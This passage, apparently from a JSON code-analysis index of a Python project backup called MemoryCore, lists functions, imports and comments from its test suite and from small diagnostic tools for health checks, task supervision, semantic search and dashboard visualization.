          "def mock_health_check(test_dir: Path) -> HealthCheck:\n\"\"\"Create a mock health check instance.\"\"\"\nhealth_check = HealthCheck(test_dir)\nhealth_check._get_system_metrics = MagicMock(return_value=mock_metrics())\nhealth_check._get_system_info = MagicMock(return_value=mock_system_info())\nreturn health_check\n\n@pytest.fixture\ndef mock_data_processor(test_dir: Path) -> DataProcessor:\n\"\"\"Create a mock data processor instance.\"\"\"",
          "def mock_data_processor(test_dir: Path) -> DataProcessor:\n\"\"\"Create a mock data processor instance.\"\"\"\nprocessor = DataProcessor(test_dir)\nprocessor.get_metrics = MagicMock(return_value=mock_metrics())\nreturn processor\n\n@pytest.fixture\ndef mock_memory_enhancer(test_dir: Path) -> MemoryEnhancer:\n\"\"\"Create a mock memory enhancer instance.\"\"\"",
          "def mock_memory_enhancer(test_dir: Path) -> MemoryEnhancer:\n\"\"\"Create a mock memory enhancer instance.\"\"\"\nenhancer = MemoryEnhancer(test_dir)\nreturn enhancer\n\n@pytest.fixture\ndef mock_logger():\n\"\"\"Create a mock logger instance.\"\"\"",
          "def mock_logger():\n\"\"\"Create a mock logger instance.\"\"\"\nreturn logging.getLogger('test')\n\n@pytest.fixture\ndef sample_service_data() -> Dict[str, Any]:\n\"\"\"Create sample service data for testing.\"\"\"",
          "def sample_service_data() -> Dict[str, Any]:\n\"\"\"Create sample service data for testing.\"\"\"\nreturn {\n'services': {\n'test_service_1': {\n'name': 'test_service_1',\n'status': 'running',\n'uptime': 3600,\n'memory_usage': 100 * 1024 * 1024,  # 100MB\n'cpu_usage': 5.0,",
          "def sample_timeline_data() -> Dict[str, Any]:\n\"\"\"Create sample timeline data for testing.\"\"\"\nreturn {\n'timeline': {\n'2025-09': [\n{\n'date': '2025-09-01T00:00:00',\n'type': 'service_start',\n'component': 'test_service_1',\n'description': 'Service started successfully'",
          "def sample_config_data() -> Dict[str, Any]:\n\"\"\"Create sample configuration data for testing.\"\"\"\nreturn {\n'monitoring': {\n'interval': 60,\n'metrics': ['cpu', 'memory', 'disk', 'network'],\n'thresholds': {\n'cpu_percent': 80,\n'memory_percent': 90,\n'disk_percent': 85",
          "def pytest_configure(config):\n\"\"\"Configure test environment.\"\"\"\nos.environ['TESTING'] = 'true'\n\ndef pytest_unconfigure(config):\n\"\"\"Cleanup test environment.\"\"\"",
          "def pytest_unconfigure(config):\n\"\"\"Cleanup test environment.\"\"\"\nos.environ.pop('TESTING', None)\n"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import pytest",
          "import tempfile",
          "from pathlib import Path",
          "from typing import Generator, Dict, Any",
          "import psutil",
          "import json",
          "import logging",
          "from unittest.mock import MagicMock",
          "from ..src.utils.logging_config import setup_logging",
          "from ..src.utils.health_check import HealthCheck",
          "from ..src.core.data_processor import DataProcessor",
          "from ..src.memory.memory_enhancer import MemoryEnhancer"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@pytest.fixture(scope='session')",
          "@pytest.fixture(scope='session')",
          "@pytest.fixture(scope='session')",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.fixture"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/test_autonomous_supervisor.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):\n\"\"\"Set up test environment.\"\"\"\n# Set up logging\nlogging.basicConfig(level=logging.DEBUG)\nself.logger = logging.getLogger('TestAutonomousSupervisor')\n\n# Create temp dir for test files\nself.test_dir = Path(tempfile.mkdtemp())\nself.test_service_dir = self.test_dir / 'services'\nself.test_service_dir.mkdir(parents=True)",
          "def tearDown(self):\n\"\"\"Clean up test environment.\"\"\"\n# Stop supervisor\nif self.supervisor:\nself.supervisor.stop()\ntime.sleep(0.1)  # Brief pause for cleanup\n\n# Remove test directory\nshutil.rmtree(self.test_dir)\n",
          "def test_initialization(self):\n\"\"\"Test supervisor initialization.\"\"\"\nself.assertIsNotNone(self.supervisor)\nself.assertEqual(self.supervisor.service_dir, self.test_service_dir)\nself.assertFalse(self.supervisor.running)\nself.assertTrue(self.supervisor.task_queue.empty())\n\ndef test_task_queue_priority(self):\n\"\"\"Test task queue prioritization.\"\"\"",
          "def test_task_queue_priority(self):\n\"\"\"Test task queue prioritization.\"\"\"\n# Add tasks with different priorities\nself.supervisor.add_task(3, 'low_priority_task')\nself.supervisor.add_task(1, 'high_priority_task')\nself.supervisor.add_task(2, 'medium_priority_task')\n\n# Check task order\ntask1 = self.supervisor.task_queue.get()\ntask2 = self.supervisor.task_queue.get()",
          "def test_task_sequence(self):\n\"\"\"Test task sequence handling.\"\"\"\nsequence = [\n(1, 'task1', {'param': 'value1'}),\n(2, 'task2', {'param': 'value2'}),\n(3, 'task3', {'param': 'value3'})\n]\n\nself.supervisor.add_sequence(sequence)\n",
          "def test_error_handling(self):\n\"\"\"Test error handling and retries.\"\"\"\nwith patch.object(self.supervisor, '_execute_task', side_effect=Exception(\"Test error\")):\nself.supervisor.start()\nself.supervisor.add_task(1, 'failing_task')\n\n# Wait for retries\ntime.sleep(0.5)\n\n# Should have tried 3 times",
          "def test_comprehensive_task_flow(self):\n\"\"\"Test a complete task processing workflow.\"\"\"\n# Add multiple tasks\nself.supervisor.add_sequence([\n(1, 'task1', {'step': 1}),\n(2, 'task2', {'step': 2}),\n(3, 'task3', {'step': 3})\n])\n\n# Mock task execution",
          "def test_task_cancellation(self):\n\"\"\"Test ability to cancel tasks.\"\"\"\n# Add a long-running task\ntask_id = 'test_task'\nself.supervisor.add_task(1, task_id, {'duration': 5})\n\n# Start processing\nself.supervisor.start()\ntime.sleep(0.1)  # Let task start\n"
        ],
        "class_defs": [
          "class TestAutonomousSupervisor(unittest.TestCase):"
        ],
        "imports": [
          "import unittest",
          "import time",
          "import logging",
          "import tempfile",
          "import shutil",
          "from pathlib import Path",
          "from unittest.mock import patch, MagicMock",
          "from src.services.autonomous_supervisor import AutonomousSupervisor"
        ],
        "comments": [
          "# Set up logging",
          "# Create temp dir for test files",
          "# Create supervisor instance",
          "# Stop supervisor",
          "# Remove test directory",
          "# Remove logging handlers",
          "# Add tasks with different priorities",
          "# Check task order",
          "# Check task order and parameters",
          "# Wait for retries",
          "# Should have tried 3 times",
          "# Add multiple tasks",
          "# Mock task execution",
          "# Start supervisor",
          "# Wait for all tasks to be processed",
          "# Check all tasks were executed",
          "# Verify task order",
          "# Add a long-running task",
          "# Start processing",
          "# Cancel task",
          "# Verify task was cancelled"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/test_health_check.py",
        "docstrings": [],
        "function_defs": [
          "def test_health_check_initialization(test_dir: Path):\n\"\"\"Test health check initialization.\"\"\"\nhealth_check = HealthCheck(test_dir)\nassert health_check.base_path == test_dir\nassert (test_dir / 'health').exists()\n\ndef test_check_system_resources(mock_health_check, mock_metrics):\n\"\"\"Test system resource checking.\"\"\"",
          "def test_check_system_resources(mock_health_check, mock_metrics):\n\"\"\"Test system resource checking.\"\"\"\nresources = mock_health_check.check_system_resources()\nassert resources['memory']['healthy'] is True\nassert resources['cpu']['healthy'] is True\nassert resources['disk']['healthy'] is True\n\ndef test_check_component_health(mock_health_check):\n\"\"\"Test component health checking.\"\"\"",
          "def test_check_component_health(mock_health_check):\n\"\"\"Test component health checking.\"\"\"\ndef mock_check():\nreturn {'status': 'healthy', 'uptime': 3600}\n\nresult = mock_health_check.check_component_health('test_component', mock_check)\nassert result['healthy'] is True\nassert result['error'] is None\nassert 'response_time' in result\n",
          "def mock_check():",
          "def test_get_system_health(mock_health_check):\n\"\"\"Test overall system health status.\"\"\"\nstatus = mock_health_check.get_system_health()\nassert status['healthy'] is True\nassert 'system_resources' in status\nassert 'error_stats' in status\nassert 'components' in status\n\ndef test_save_health_status(mock_health_check, test_dir):\n\"\"\"Test health status saving.\"\"\"",
          "def test_save_health_status(mock_health_check, test_dir):\n\"\"\"Test health status saving.\"\"\"\nstatus = {\n'timestamp': '2025-09-07T04:23:00Z',\n'healthy': True,\n'components': {}\n}\nmock_health_check._save_health_status(status)\n\nstatus_file = test_dir / 'health/health_status.json'",
          "def test_error_handling(mock_health_check):\n\"\"\"Test error handling in health checks.\"\"\"\ndef failing_check():\nraise Exception(\"Test error\")\n\nresult = mock_health_check.check_component_health('test_component', failing_check)\nassert result['healthy'] is False\nassert 'Test error' in result['error']\n\ndef test_threshold_monitoring(mock_health_check, mock_metrics):",
          "def failing_check():",
          "def test_threshold_monitoring(mock_health_check, mock_metrics):\n\"\"\"Test threshold monitoring.\"\"\"\n# Simulate high CPU usage\nwith patch.dict(mock_metrics, {'cpu': {'percent': 95.0}}):\nmock_health_check._get_system_metrics = MagicMock(return_value=mock_metrics)\nresources = mock_health_check.check_system_resources()\nassert resources['cpu']['healthy'] is False\n\ndef test_component_status_history(mock_health_check, test_dir):\n\"\"\"Test component status history tracking.\"\"\"",
          "def test_component_status_history(mock_health_check, test_dir):\n\"\"\"Test component status history tracking.\"\"\"\ncomponent_name = 'test_component'\n\n# Generate some test history\nfor i in range(3):\nstatus = {\n'healthy': True if i % 2 == 0 else False,\n'timestamp': f'2025-09-07T04:23:{i:02d}Z',\n'error': None if i % 2 == 0 else 'Test error'",
          "def test_resource_threshold_configuration(test_dir):\n\"\"\"Test resource threshold configuration.\"\"\"\ncustom_thresholds = {\n'cpu_percent': 70.0,\n'memory_percent': 80.0,\n'disk_percent': 75.0\n}\n\nhealth_check = HealthCheck(test_dir, thresholds=custom_thresholds)\nassert health_check.thresholds == custom_thresholds",
          "def test_health_check_recovery(mock_health_check):\n\"\"\"Test health check recovery handling.\"\"\"\ncomponent_name = 'recovery_test'\n\n# Simulate component failure\ndef failing_check():\nraise Exception(\"Component failure\")\n\nresult1 = mock_health_check.check_component_health(component_name, failing_check)\nassert result1['healthy'] is False",
          "def failing_check():",
          "def recovered_check():",
          "def test_concurrent_health_checks(mock_health_check):\n\"\"\"Test concurrent health check handling.\"\"\"\nimport concurrent.futures\nimport time\n\ndef slow_check():\ntime.sleep(0.1)\nreturn {'status': 'healthy'}\n\n# Run multiple health checks concurrently",
          "def slow_check():",
          "def test_metrics_cache_invalidation(mock_health_check):\n\"\"\"Test metrics cache invalidation.\"\"\"\n# Get metrics twice in quick succession\nmetrics1 = mock_health_check.check_system_resources()\nmetrics2 = mock_health_check.check_system_resources()\n\n# Should use cached values\nassert mock_health_check._get_system_metrics.call_count == 1\n\n# Wait for cache invalidation"
        ],
        "class_defs": [],
        "imports": [
          "import pytest",
          "from pathlib import Path",
          "from unittest.mock import MagicMock, patch",
          "import json",
          "from ..src.utils.health_check import HealthCheck",
          "import concurrent.futures",
          "import time"
        ],
        "comments": [
          "# Simulate high CPU usage",
          "# Generate some test history",
          "# Test with high memory usage but below custom threshold",
          "# Simulate component failure",
          "# Simulate recovery",
          "# Verify recovery was logged",
          "# Run multiple health checks concurrently",
          "# Get metrics twice in quick succession",
          "# Should use cached values",
          "# Wait for cache invalidation",
          "# Should fetch fresh metrics"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/test_memory_integration.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):",
          "def tearDown(self):",
          "def test_chatgpt_export_empty(self):\n\"\"\"Test that ChatGPT export handles empty state properly\"\"\"\nexporter = ChatGPTExporter(self.base_path)\nresult = exporter.export_conversations()\nself.assertEqual(result, [])\n\ndef test_save_and_export_conversation(self):\n\"\"\"Test saving and then exporting a conversation\"\"\"",
          "def test_save_and_export_conversation(self):\n\"\"\"Test saving and then exporting a conversation\"\"\"\nexporter = ChatGPTExporter(self.base_path)\n\n# Create test conversation\ntest_conversation = {\n\"id\": \"test_chat_01\",\n\"create_time\": \"2025-09-05T10:00:00Z\",\n\"update_time\": \"2025-09-05T10:30:00Z\",\n\"title\": \"Test Conversation\","
        ],
        "class_defs": [
          "class TestMemoryIntegration(unittest.TestCase):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import unittest",
          "from pathlib import Path",
          "import shutil",
          "from src.memory.chatgpt_extractor import ChatGPTExporter"
        ],
        "comments": [
          "# Add src to Python path",
          "# Now we can import our modules",
          "# Clean up any test files",
          "# Create test conversation",
          "# Save conversation",
          "# Export and verify"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/test_semantic_search.py",
        "docstrings": [],
        "function_defs": [
          "def setUp(self):",
          "def tearDown(self):",
          "def test_search_exact_match(self):\n\"\"\"Test search with exact term matches.\"\"\"\nresults = self.search.search(\"semantic search\")\nself.assertGreater(len(results), 0)\nself.assertEqual(results[0].source_id, 'test1')\nself.assertGreater(results[0].score, 0.7)  # High confidence for exact match\n\ndef test_search_semantic_similarity(self):\n\"\"\"Test search with semantically similar terms.\"\"\"",
          "def test_search_semantic_similarity(self):\n\"\"\"Test search with semantically similar terms.\"\"\"\nresults = self.search.search(\"speed issues\")  # Should match performance-related memories\nself.assertGreater(len(results), 0)\n# Should find memory about latency\nperformance_related = [r.source_id for r in results if r.source_id in ['test1', 'test3']]\nself.assertGreater(len(performance_related), 0)\n\ndef test_context_extraction(self):\n\"\"\"Test context extraction from search results.\"\"\"",
          "def test_context_extraction(self):\n\"\"\"Test context extraction from search results.\"\"\"\n# Test with related performance terms\nperformance_terms = [\"performance\", \"speed\", \"latency\"]\nresults = self.search.search(\"system performance\")\nself.assertGreater(len(results), 0)\n\nfor result in results:\nself.assertIsNotNone(result.context)\nself.assertGreater(len(result.context), 0)",
          "def test_threshold_filtering(self):\n\"\"\"Test that results below threshold are filtered out.\"\"\"\n# Set a very high threshold\nself.search.config.score_threshold = 0.95\nresults = self.search.search(\"completely unrelated query\")\nself.assertEqual(len(results), 0)\n\ndef test_memory_stats(self):\n\"\"\"Test statistics generation.\"\"\"",
          "def test_memory_stats(self):\n\"\"\"Test statistics generation.\"\"\"\nstats = self.search.get_stats()\nself.assertEqual(stats['total_memories'], 3)\nself.assertGreater(stats['index_size_mb'], 0)\nself.assertEqual(stats['unique_sources'], 3)\n\nif __name__ == '__main__':\nunittest.main()\n"
        ],
        "class_defs": [
          "class TestSemanticSearch(unittest.TestCase):"
        ],
        "imports": [
          "import unittest",
          "from pathlib import Path",
          "import shutil",
          "import tempfile",
          "from src.memory.semantic_search import SemanticSearchEngine, SearchConfig"
        ],
        "comments": [
          "# Create temporary directory for test data",
          "# Add test memories",
          "# Clean up test directory",
          "# Should find memory about latency",
          "# Test with related performance terms",
          "# Check if any performance-related term is in the context",
          "# Set a very high threshold"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/test_services.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, name: str, test_mode: bool = False):",
          "def _run(self):\n\"\"\"Test run implementation.\"\"\"\nself.run_count += 1\nif self.should_fail:\nraise Exception(\"Test failure\")\nwhile self.running and not self.test_mode:\ntime.sleep(0.1)\n\nclass TestBaseService(unittest.TestCase):\n\"\"\"Test cases for BaseService.\"\"\"",
          "def setUp(self):\n\"\"\"Set up test environment.\"\"\"\n# Create temp directory for test files\nself.test_dir = tempfile.mkdtemp()\nself.addCleanup(shutil.rmtree, self.test_dir)\n\n# Configure service paths\nservice_config.base_path = Path(self.test_dir)\nservice_config.create_dirs()\n",
          "def test_initialization(self):\n\"\"\"Test service initialization.\"\"\"\nself.assertEqual(self.service.name, 'test_service')\nself.assertFalse(self.service.running)\nself.assertEqual(self.service.error_count, 0)\nself.assertIsNone(self.service.last_error)\n\ndef test_start_stop(self):\n\"\"\"Test service start/stop.\"\"\"",
          "def test_start_stop(self):\n\"\"\"Test service start/stop.\"\"\"\n# Start service\nself.assertTrue(self.service.start())\nself.assertTrue(self.service.running)\nself.assertEqual(self.service.state['status'], 'running')\n\n# Stop service\nself.service.stop()\nself.assertFalse(self.service.running)",
          "def test_error_handling(self):\n\"\"\"Test error handling and recovery.\"\"\"\nself.service.should_fail = True\nself.assertFalse(self.service.start())\nself.assertEqual(self.service.error_count, 3)  # Max retries\nself.assertFalse(self.service.running)\nself.assertEqual(self.service.state['status'], 'failed')\n\ndef test_state_persistence(self):\n\"\"\"Test state saving and loading.\"\"\"",
          "def test_state_persistence(self):\n\"\"\"Test state saving and loading.\"\"\"\nself.service.start()\ntime.sleep(0.1)  # Allow time for state update\nself.service.stop()\n\n# Verify state file exists and contains expected data\nstate_file = service_config.get_state_file('test_service')\nself.assertTrue(state_file.exists())\n",
          "def test_logging(self):\n\"\"\"Test service logging.\"\"\"\nlog_file = service_config.get_log_file('test_service')\n\n# Generate some log entries\nself.service.logger.info(\"Test info message\")\nself.service.logger.error(\"Test error message\")\n\n# Verify log file\nself.assertTrue(log_file.exists())"
        ],
        "class_defs": [
          "class TestService(BaseService):",
          "class TestBaseService(unittest.TestCase):"
        ],
        "imports": [
          "import unittest",
          "import tempfile",
          "import shutil",
          "from pathlib import Path",
          "import time",
          "import logging",
          "import json",
          "from src.services.base_service import BaseService",
          "from src.config.service_config import service_config"
        ],
        "comments": [
          "# Create temp directory for test files",
          "# Configure service paths",
          "# Create test service",
          "# Start service",
          "# Stop service",
          "# Verify state file exists and contains expected data",
          "# Generate some log entries",
          "# Verify log file"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/test_visualization.py",
        "docstrings": [],
        "function_defs": [
          "def test_visualization_initialization(self, test_dir):\n\"\"\"Test visualization system initialization.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\nassert viz.base_path == test_dir\nassert (test_dir / 'visualizations').exists()\n\ndef test_memory_cluster_visualization(self, test_dir):\n\"\"\"Test memory cluster visualization generation.\"\"\"",
          "def test_memory_cluster_visualization(self, test_dir):\n\"\"\"Test memory cluster visualization generation.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\n\n# Sample cluster data\nclusters = {\n'cluster1': {\n'topic': 'Performance',\n'size': 5,\n'coherence': 0.8,",
          "def test_relationship_visualization(self, test_dir):\n\"\"\"Test memory relationship visualization.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\n\n# Sample relationship data\nrelationships = [\n{'source': 'mem1', 'target': 'mem2', 'strength': 0.8},\n{'source': 'mem2', 'target': 'mem3', 'strength': 0.6}\n]\n",
          "def test_temporal_visualization(self, test_dir):\n\"\"\"Test temporal visualization of memory evolution.\"\"\"\nviz = MemoryVisualizationDashboard(test_dir)\n\n# Generate temporal data\nnow = datetime.now()\ntemporal_data = []\nfor i in range(5):\ntemporal_data.append({\n'timestamp': (now - timedelta(days=i)).isoformat(),",
          "def test_metrics_chart_generation(self, test_dir, mock_metrics):\n\"\"\"Test metrics chart generation.\"\"\"\nviz = MetricsVisualization(test_dir)\n\n# Generate charts for each metric type\ncharts = viz.generate_metric_charts(mock_metrics)\n\nassert 'cpu_chart' in charts\nassert 'memory_chart' in charts\nassert 'disk_chart' in charts",
          "def test_realtime_update(self, test_dir):\n\"\"\"Test real-time chart updates.\"\"\"\nviz = MetricsVisualization(test_dir)\n\n# Mock WebSocket connection\nmock_ws = MagicMock()\nviz.register_websocket(mock_ws)\n\n# Send test update\ntest_data = {'cpu_percent': 75.0}",
          "def test_threshold_visualization(self, test_dir, mock_metrics):\n\"\"\"Test threshold visualization in charts.\"\"\"\nviz = MetricsVisualization(test_dir)\n\n# Set custom thresholds\nthresholds = {\n'cpu_percent': 80.0,\n'memory_percent': 90.0,\n'disk_percent': 85.0\n}",
          "def test_timeline_generation(self, test_dir, sample_timeline_data):\n\"\"\"Test timeline visualization generation.\"\"\"\nviz = TimelineVisualization(test_dir)\n\nhtml = viz.generate_timeline(sample_timeline_data)\nsoup = BeautifulSoup(html, 'html.parser')\n\n# Check timeline elements\ntimeline = soup.find(class_='timeline')\nassert timeline is not None",
          "def test_timeline_filtering(self, test_dir, sample_timeline_data):\n\"\"\"Test timeline filtering functionality.\"\"\"\nviz = TimelineVisualization(test_dir)\n\n# Filter for error events\nfiltered_html = viz.generate_timeline(\nsample_timeline_data,\nfilters=['error']\n)\nsoup = BeautifulSoup(filtered_html, 'html.parser')",
          "def test_timeline_aggregation(self, test_dir):\n\"\"\"Test timeline data aggregation.\"\"\"\nviz = TimelineVisualization(test_dir)\n\n# Generate test events across multiple days\nevents = []\nnow = datetime.now()\nfor i in range(10):\nevents.append({\n'date': (now - timedelta(days=i)).isoformat(),"
        ],
        "class_defs": [
          "class TestMemoryVisualization:",
          "class TestMetricsVisualization:",
          "class TestTimelineVisualization:"
        ],
        "imports": [
          "import pytest",
          "from pathlib import Path",
          "from bs4 import BeautifulSoup",
          "import json",
          "from datetime import datetime, timedelta",
          "from unittest.mock import MagicMock, patch",
          "from ..src.visualizations.memory_viz import MemoryVisualizationDashboard",
          "from ..src.visualizations.metrics_viz import MetricsVisualization",
          "from ..src.visualizations.timeline_viz import TimelineVisualization"
        ],
        "comments": [
          "# Sample cluster data",
          "# Check visualization elements",
          "# Sample relationship data",
          "# Check graph elements",
          "# Generate temporal data",
          "# Check timeline elements",
          "# Generate charts for each metric type",
          "# Verify chart data",
          "# Mock WebSocket connection",
          "# Send test update",
          "# Verify WebSocket message",
          "# Set custom thresholds",
          "# Verify threshold lines in chart",
          "# Check timeline elements",
          "# Verify event types",
          "# Filter for error events",
          "# Should only show error events",
          "# Generate test events across multiple days",
          "# Aggregate by day",
          "# Verify aggregation structure",
          "# Mock WebSocket connection",
          "# Add test event",
          "# Verify WebSocket message"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/test_websocket_server.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class TestWebSocketServer:"
        ],
        "imports": [
          "import pytest",
          "import asyncio",
          "import websockets",
          "import json",
          "from pathlib import Path",
          "from datetime import datetime",
          "from unittest.mock import MagicMock, patch",
          "from ..src.core.websocket_server import DashboardWebSocketServer"
        ],
        "comments": [
          "# Reduce intervals for testing",
          "# Start server",
          "# Connect client",
          "# Client should be removed after disconnection",
          "# Clean up",
          "# Subscribe to metrics",
          "# Unsubscribe from metrics",
          "# Subscribe to metrics",
          "# Wait for metrics broadcast",
          "# Subscribe to health updates",
          "# Wait for health broadcast",
          "# Send invalid JSON",
          "# Send metrics history query",
          "# Start server",
          "# Connect multiple clients",
          "# Subscribe all clients to metrics",
          "# Clean up",
          "# Start server",
          "# Connect and subscribe client",
          "# Abruptly close connection",
          "# Client should be removed from subscriptions",
          "# Clean up",
          "# Subscribe client",
          "# Mock failure in metrics collection",
          "# Wait for broadcast attempt",
          "# Server should still be running"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": [
          "@pytest.fixture",
          "@pytest.fixture",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio",
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tools/code_analyzer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _setup_logging(self):\n\"\"\"Set up logging configuration.\"\"\"\nhandler = logging.StreamHandler()\nformatter = logging.Formatter(\n'%(asctime)s - %(name)s - %(levelname)s - %(message)s'\n)\nhandler.setFormatter(formatter)\nself.logger.addHandler(handler)\nself.logger.setLevel(logging.INFO)\n",
          "def analyze_file(self, file_path: str) -> List[Dict[str, Any]]:\n\"\"\"Analyze a Python file for potential issues.\"\"\"\nself.issues = []\nself.current_file = file_path\n\ntry:\nwith open(file_path, 'r') as f:\ncontent = f.read()\n\n# Parse the content into an AST",
          "def _check_try_except_structure(self, tree: ast.AST):\n\"\"\"Check for issues with try/except block structure.\"\"\"\nclass TryExceptVisitor(ast.NodeVisitor):\ndef __init__(self):\nself.issues = []\nself.try_stack = []\n\ndef visit_Try(self, node):\n# Check if finally block exists without except\nif node.finalbody and not node.handlers:",
          "def __init__(self):",
          "def visit_Try(self, node):",
          "def _check_html_tag_balance(self, content: str):\n\"\"\"Check for unbalanced HTML tags in string literals.\"\"\"\n# Simple HTML tag stack checker\nlines = content.split('\\n')\nstack = []\nin_string = False\nstring_start = None\n\nfor i, line in enumerate(lines, 1):\n# Skip lines that are clearly not HTML (quick heuristic)",
          "def _check_indentation_consistency(self, content: str):\n\"\"\"Check for inconsistent indentation.\"\"\"\nlines = content.split('\\n')\nindent_sizes = set()\n\nfor i, line in enumerate(lines, 1):\nif line.strip():  # Skip empty lines\n# Calculate leading spaces\nindent = len(line) - len(line.lstrip())\nif indent > 0:",
          "def _check_string_formatting(self, tree: ast.AST):\n\"\"\"Check for potential string formatting issues.\"\"\"\nclass StringFormattingVisitor(ast.NodeVisitor):\ndef __init__(self):\nself.issues = []\n\ndef visit_JoinedStr(self, node):\n# Check f-string complexity\nif len(node.values) > 5:  # Arbitrary threshold\nself.issues.append({",
          "def __init__(self):",
          "def visit_JoinedStr(self, node):",
          "def visit_Call(self, node):",
          "def main():\n\"\"\"Main entry point for the code analyzer.\"\"\"\nif len(sys.argv) < 2:\nprint(\"Usage: python code_analyzer.py <path_to_python_file>\")\nsys.exit(1)\n\nfile_path = sys.argv[1]\nif not Path(file_path).exists():\nprint(f\"File not found: {file_path}\")\nsys.exit(1)"
        ],
        "class_defs": [
          "class CodeAnalyzer:",
          "class TryExceptVisitor(ast.NodeVisitor):",
          "class StringFormattingVisitor(ast.NodeVisitor):"
        ],
        "imports": [
          "import ast",
          "import sys",
          "from pathlib import Path",
          "import logging",
          "from typing import List, Dict, Any, Optional, Tuple"
        ],
        "comments": [
          "# Parse the content into an AST",
          "# Run all analysis methods",
          "# Check if finally block exists without except",
          "# Check for nested try blocks",
          "# Simple HTML tag stack checker",
          "# Skip lines that are clearly not HTML (quick heuristic)",
          "# Handle multi-line strings",
          "# Very basic HTML tag parsing",
          "# Closing tag",
          "# Opening tag",
          "# Calculate leading spaces",
          "# Check if we have multiple indentation sizes",
          "# Check f-string complexity",
          "# Check for format() calls",
          "# Print issues in a readable format"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tools/error_diagnostics.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def check_indentation(self, file_path: Path) -> List[Dict]:\n\"\"\"Check for indentation issues.\"\"\"\nissues = []\nwith open(file_path) as f:\nlines = f.readlines()\ncurrent_indent = 0\nfor i, line in enumerate(lines, 1):\nif line.strip() and (not line.strip().startswith('#')):\nleading_spaces = len(line) - len(line.lstrip())\nif leading_spaces % 4 != 0:",
          "def check_try_except(self, file_path: Path) -> List[Dict]:\n\"\"\"Check for incomplete try/except blocks.\"\"\"\nissues = []\nwith open(file_path) as f:\ncontent = f.read()\ntry:\ntree = ast.parse(content)\nfor node in ast.walk(tree):\nif isinstance(node, ast.Try):\nif not node.handlers:",
          "def check_network_metrics(self, file_path: Path) -> List[Dict]:\n\"\"\"Check network metrics collection code.\"\"\"\nissues = []\nwith open(file_path) as f:\ncontent = f.read()\ntry:\nconnections = psutil.net_connections()\nexcept Exception as e:\nlogger.error(f'Error getting network connections: {e}')\nconnections = []",
          "def fix_indentation(self, file_path: Path) -> bool:\n\"\"\"Fix indentation issues.\"\"\"\ntry:\nwith open(file_path) as f:\ncontent = f.read()\ntree = ast.parse(content)\nfixed = ast.unparse(tree)\nwith open(file_path, 'w') as f:\nf.write(fixed)\nreturn True",
          "def fix_try_except(self, file_path: Path) -> bool:\n\"\"\"Fix incomplete try/except blocks.\"\"\"\ntry:\nwith open(file_path) as f:\nlines = f.readlines()\nfixed_lines = []\nin_try = False\ntry_indent = 0\nfor line in lines:\nif 'try:' in line and (not in_try):",
          "def fix_network_metrics(self, file_path: Path) -> bool:\n\"\"\"Fix network metrics collection.\"\"\"\ntry:\nwith open(file_path) as f:\nlines = f.readlines()\nfixed_lines = []\nnetwork_ops = {'psutil.net_connections()': \"try:\\n    connections = psutil.net_connections()\\nexcept Exception as e:\\n    logger.error(f'Error getting network connections: {e}')\\n    connections = []\", 'requests.get(': \"try:\\n    response = requests.get(url, timeout=5)\\nexcept Exception as e:\\n    logger.error(f'Request failed: {e}')\\n    response = None\", 'socket.socket(': \"try:\\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\\n        s.settimeout(5)\\nexcept Exception as e:\\n    logger.error(f'Socket error: {e}')\"}\ni = 0\nwhile i < len(lines):\nline = lines[i]",
